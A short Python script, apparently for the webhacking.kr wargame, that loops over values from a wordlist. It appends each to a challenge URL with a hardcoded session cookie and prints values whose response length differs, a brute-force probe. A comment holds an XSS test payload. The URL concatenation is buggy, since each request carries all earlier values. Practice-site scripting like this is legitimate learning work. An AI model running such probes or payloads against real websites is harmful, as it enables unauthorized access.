import httplib
import requests

url="http://webhacking.kr/challenge/bonus/bonus-3/index.php?code="
param=""
cookies=dict(PHPSESSID="tn15fadg2565puald856s8t7u2")

f=open('list.txt','r')
for line in f:
  param=line
  url=url+param
  r=requests.get(url,cookies=cookies)
  
  if len(r.text)==472:
    #print len(r.text)
    pass
  else:
    print line   
    # <script>alert(1);</script> 
    